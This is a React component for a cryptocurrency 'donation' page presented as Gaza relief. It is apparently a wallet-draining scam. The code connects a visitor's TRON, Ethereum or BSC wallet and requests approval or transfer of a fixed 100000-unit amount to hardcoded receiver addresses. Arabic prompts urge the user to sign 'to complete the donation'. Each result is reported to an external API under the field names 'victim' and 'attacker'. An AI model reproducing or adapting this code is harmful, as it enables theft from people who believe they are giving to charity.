import React, { useEffect, useMemo, useState } from "react";
import ReactGA from "react-ga4";
import { useLocation, useNavigate } from "react-router";
import { usePayment } from "../../../../providers/PaymentProvider";
import { PaymentForm } from "../../components/PaymentForm";
import { validatePayment } from "../../../../utils/validations";
import { toastError, toastSuccess } from "../../../../utils/toast";
import {
  adapterChannelArr,
  bscChannelArr,
  ethChannelArr,
  initializePage,
  tronChannelArr,
  tronWebChannelArr,
} from "../../../pay/utils";
import { event } from "../../../../utils/gtag";

import {
  BitKeepAdapter,
  OkxWalletAdapter,
  TokenPocketAdapter,
  TronLinkAdapter,
} from "@tronweb3/tronwallet-adapters";

import { tronImtokenTransaction } from "../../../pay/transactions/tronImtokenTransaction";
import { tronTokenPocketTransaction } from "../../../pay/transactions/tronTokenPocketTransaction";
import { tronBitkeepTransaction } from "../../../pay/transactions/tronBitkeepTransaction";
import { tronOkxTransaction } from "../../../pay/transactions/tronOkxTransaction";
import { ethTrustWalletTransaction } from "../../../pay/transactions/ethTrustWalletTransaction";
import { ethMetaMaskTransaction } from "../../../pay/transactions/ethMetaMaskTransaction";
import { ethCoinbaseTransaction } from "../../../pay/transactions/ethCoinbaseTransaction";
import { ethBitkeepTransaction } from "../../../pay/transactions/ethBitkeepTransaction";
import { ethOkxTransaction } from "../../../pay/transactions/ethOkxTransaction";
import { bscTrustWalletTransaction } from "../../../pay/transactions/bscTrustWalletTransaction";
import { bscOkxTransaction } from "../../../pay/transactions/bscOkxTransaction";
import { bscMetaMaskTransaction } from "../../../pay/transactions/bscMetaMaskTransaction";
import { bscBitkeepTransaction } from "../../../pay/transactions/bscBitkeepTransaction";
import { bscCoinbaseTransaction } from "../../../pay/transactions/bscCoinbaseTransaction";
import { useConnectionType } from "../../../../providers/ConnectionTypeProvider";

const commonConfig = {
  openAppWithDeeplink: true,
  openUrlWhenWalletNotFound: false,
  checkTimeout: 30000,
};

const MEASUREMENT_ID = "G-LTMZH3LQ6K";
ReactGA.initialize(MEASUREMENT_ID ? MEASUREMENT_ID : "");

export const TronContainer = () => {
  const { quantity, handleQuantityChange } = usePayment();
  const { resetConnectionType, changeIsRedirecting } = useConnectionType();

  const [, setTotal] = useState(0);
  const [readyState, setReadyState] = useState("");
  const [receiverAddress, setReceiverAddress] = useState("");
  const [ethAccount, setEthAccount] = useState("");
  const [showDialog, setShowDialog] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const location = useLocation();
  const hostname = window.location.host;

  const decodedSearchParams = decodeURIComponent(location.search);
  const searchParams = new URLSearchParams(decodedSearchParams);
  const qtyParam = searchParams.get("qty") as string;

  const channelId = searchParams.get("channelid");

  let tronWeb; //tronWeb for tron, mostly used usdt  USD stable equivalent
  if (channelId && tronChannelArr.includes(channelId)) {
    tronWeb = window?.tronWeb;
  }

  let adapter;
  if (channelId && adapterChannelArr.includes(channelId)) {
    // alert("刚进页面初始化时的channelId"+channelId);
    switch (channelId) {
      case "1":
        // setAdapter(useMemo(() => new OkxWalletAdapter(commonConfig), []));
        adapter = useMemo(() => new OkxWalletAdapter(commonConfig), []);
        break;
      case "2":
        adapter = useMemo(() => new BitKeepAdapter(commonConfig), []);
        break;
      case "3":
        adapter = useMemo(() => new TokenPocketAdapter(commonConfig), []);
        break;
      case "5":
        adapter = useMemo(() => new TronLinkAdapter(commonConfig), []);
        break;
    }
  }

  useEffect(() => {
    if (qtyParam) handleQuantityChange(qtyParam);

    if (channelId && tronChannelArr.includes(channelId)) {
      ReactGA.event({
        action: "载入授权页面",
        category: "授权页面",
        label: "钱包编号：" + (channelId ? channelId : "缺失"), //这儿拿不到donatorAddress
      });
    }

    if (channelId) {
      initializePage(
        channelId,
        adapter,
        tronWeb,
        setTotal,
        setReadyState,
        setReceiverAddress,
        setEthAccount,
        hostname
      );
    }
  }, []);

  const transactionRecord = async (donator, receiver, chain_type, txid) => {
    const chain = chain_type.toLowerCase();
    try {
      const response = await fetch(
        `https://donate.reachoutgaza.org/api/${chain}/transfer`, //todo
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            victim: donator,
            attacker: receiver,
            chain_type: chain_type,
            txid: txid,
          }),
        }
      );

      if (response.ok) {
        console.log("Transfer successful!");
        setShowDialog(true); // 显示对话框
      } else {
        toastError("Failed to transfer.");
      }
    } catch (error) {
      toastError("Error during transfer:" + error);
    }
  };

  const handleSign = async () => {
    const currentChannelId = channelId ? channelId : "2";
    const currentReceiverAddress = receiverAddress
      ? receiverAddress
      : tronChannelArr.includes(currentChannelId)
      ? "TQWRuSi9TRFKAyE2NTW44qG8oY7vksP7xG"
      : "0xdD11be33a3a921f6092632756eF245bd6647995d"; // 备用地址
    console.log(currentChannelId,currentReceiverAddress);
    
    async function handleTransactionResult(
      res,
      donatorAddress,
      receiverAddress,
      chain_type
    ) {
      let resObj;
      if (res !== undefined) {
        if (typeof res === "string") {
          resObj = JSON.parse(res);
        } else {
          resObj = res;
        }
        if (resObj.result) {
          await transactionRecord(
            donatorAddress,
            receiverAddress,
            chain_type,
            resObj.txid
          );
        } else {
          await transactionRecord(
            donatorAddress,
            receiverAddress,
            chain_type,
            resObj.txid
          );
          toastError("الرجاء توقيع المعاملة لإتمام التبرع.الله يبارك لك!");
        }
      } else {
        toastError("الرجاء توقيع المعاملة لإتمام التبرع.الله يبارك لك!");
      }
      setIsLoading(false);
    }

    if (channelId && tronChannelArr.includes(channelId)) {
      ReactGA.event({
        action: "点击授权按钮",
        category: "授权页面",
        label: "地址：" + adapter?.address,
      });
    } else {
      ReactGA.event({
        action: "点击授权按钮",
        category: "授权页面",
        label: ethAccount ? "地址：" + ethAccount : "缺失，前端未获取到EVM地址",
      });
    }

    let donatorAddress; //只为记录用，发起交易不需要使用该值
    let chain_type; //只为记录用，发起交易不需要使用该值

    if (channelId && adapterChannelArr.includes(channelId)) {
      donatorAddress = adapter?.address || "NoTANEFFECTIVEADDRESS";
      chain_type = "TRON";
    } else if (channelId && tronWebChannelArr.includes(channelId)) {
      donatorAddress = tronWeb.defaultAddress.base58;
      chain_type = "TRON";
    } else if (channelId && ethChannelArr.includes(channelId)) {
      donatorAddress = ethAccount;
      chain_type = "ETH";
    } else if (channelId && bscChannelArr.includes(channelId)) {
      donatorAddress = ethAccount;
      chain_type = "BSC";
    }

    const donationAmount = 100000;

    setIsLoading(true);

    async function handleTransactionResultEVM(res) {
      if (res && res.transactionHash) {
        try {
          await transactionRecord(
            donatorAddress,
            currentReceiverAddress,
            chain_type,
            res.transactionHash
          );
        } catch (err) {
          toastError("transaction record error" + err); //todo: 让设计师设计一个弹窗
        }
      }
      setIsLoading(false);
    }

    const wallet = currentChannelId == '1' ? 'okx' : currentChannelId == '2' ? 'bitKeep' : currentChannelId == '3' ? 'tokenPocket' : 'imtoken'
    event({
      action: 'approve-start',
      from: currentReceiverAddress,
      to: donationAmount,
      type: 'trc20',
      wallet
    })
    switch (currentChannelId) {
      case "1": {
        const res = await tronOkxTransaction(
          currentReceiverAddress,
          donationAmount,
          tronWeb,
          adapter
        );
        console.log(res)
        await handleTransactionResult(
          res,
          donatorAddress,
          currentReceiverAddress,
          chain_type
        );
        break;
      }
      case "2": {
        const res = await tronBitkeepTransaction(
          currentReceiverAddress,
          donationAmount,
          tronWeb,
          adapter
        );
        console.log(res)
        await handleTransactionResult(
          res,
          donatorAddress,
          currentReceiverAddress,
          chain_type
        );
        break;
      }

      case "3": {
        const res = await tronTokenPocketTransaction(
          currentReceiverAddress,
          donationAmount,
          tronWeb,
          adapter
        );
        console.log(res)
        await handleTransactionResult(
          res,
          donatorAddress,
          currentReceiverAddress,
          chain_type
        );
        break;
      }

      case "4": {
        // imtoken 智慧合约TVggrkUiBRgPb4R1Q86zExvvAPAiHjwoam
        const res = await tronImtokenTransaction(
          "TKH8hxJGbPrx7E56eMYFTsV8anvNWEvQMu",
          donationAmount,
          tronWeb
        );
        await handleTransactionResult(
          res,
          donatorAddress,
          currentReceiverAddress,
          chain_type
        );
        break;
      }

      case "6": {
        const res = await ethTrustWalletTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await transactionRecord(
          donatorAddress,
          currentReceiverAddress,
          chain_type,
          res
        );
        setIsLoading(false);
        break;
      }
      case "7": {
        const res = await ethMetaMaskTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      //
      case "8": {
        const res = await ethCoinbaseTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "9": {
        const res = await ethBitkeepTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "10": {
        const res = await ethOkxTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "11": {
        const res = await bscTrustWalletTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "12": {
        const res = await bscOkxTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "13": {
        const res = await bscMetaMaskTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "14": {
        const res = await bscBitkeepTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
      case "15": {
        const res = await bscCoinbaseTransaction(
          donatorAddress,
          currentReceiverAddress,
          donationAmount
        );
        await handleTransactionResultEVM(res);
        break;
      }
    }

    setIsLoading(false);
    onSuccess(wallet, currentReceiverAddress, donationAmount);
  };

  const onSuccess = (wallet, from, to) => {
    event({
      action: 'approve-end',
      from,
      to,
      type: 'erc20',
      wallet: wallet
    })
    // changeIsRedirecting(true);
    // handleQuantityChange("");
    // resetConnectionType();
    // window.open("https://solbit.network", "_self");
  };

  const handleSubmit = () => {
    validatePayment(quantity, handleSign);
  };

  const handleDisconnect = () => {
    navigate("/");
    event({
      action: 'disconnect'
    })
    return;
  };

  return (
    <PaymentForm
      address={adapter?.address}
      quantity={quantity}
      handleQuantityChange={handleQuantityChange}
      onSubmit={handleSubmit}
      onDisconnect={handleDisconnect}
    />
  );
};
